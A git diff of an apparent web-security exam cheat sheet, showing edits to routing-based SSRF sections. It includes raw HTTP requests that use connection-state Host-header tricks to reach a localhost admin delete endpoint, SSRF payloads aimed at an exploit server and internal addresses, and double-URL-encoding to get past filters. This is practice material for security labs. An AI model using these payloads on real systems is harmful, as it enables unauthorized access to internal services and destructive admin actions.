@@ -567,9 +567,9 @@ X-Forwarded-Server: EXPLOIT.net
 >Target is vulnerable to **routing-based SSRF** via the Host header, but validate connection state of the first request. Sending grouped request in sequence using **single connection** and setting the connection header to **keep-alive**, bypass host header validation and enable SSRF exploit of local server.  
 
 ```html
-GET /intranet/service HTTP/1.1
-Host: TARGET.web-security-academy.net
-Cookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW
+GET / HTTP/1.1
+Host: TARGET.net
+Cookie: session=ValueOfSessionCookie
 Content-Length: 48
 Content-Type: text/plain;charset=UTF-8
 Connection: keep-alive
@@ -578,13 +578,13 @@ Connection: keep-alive
 >Next request is the second tab in group sequence of requests.  
 
 ```html
-POST /service/intranet HTTP/1.1
+POST /admin/delete HTTP/1.1
 Host: localhost
 Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
 Content-Type: x-www-form-urlencoded
 Content-Length: 53
 
-csrf=YOUR-CSRF-TOKEN&username=carlos
+csrf=TheCSRFTokenValue&username=carlos
 ```  
 
 >Observe that the second request has successfully accessed the admin panel.  
@@ -1453,8 +1453,8 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 ## SSRF - Server Side Request Forgery  
 
 >SSRF attack cause the server to make a connection to internal services within the organization, or force the server to connect to arbitrary external systems, potentially leaking sensitive data.  
-
->SSRF exploitation examples.  
+  
+>SSRF Sample payloads.  
 
 ```html
 /product/nextProduct?currentProductId=6&path=https://EXPLOIT.net  
@@ -1466,7 +1466,7 @@ http://127.1:6566/admin
 Host: localhost
 ```  
 
->Double URL encode characters in URL such as to **Obfuscate** the "a" by double-URL encoding it to ```%2561```, resulting in the bypass of blacklist filter.  
+>Double URL encode characters in URL to **Obfuscate** the "a" by double-URL encoding it to ```%2561```, resulting in the bypass of blacklist filter.  
 
 ![ssrf obfuscated](images/ssrf-obfuscated.png)  
 
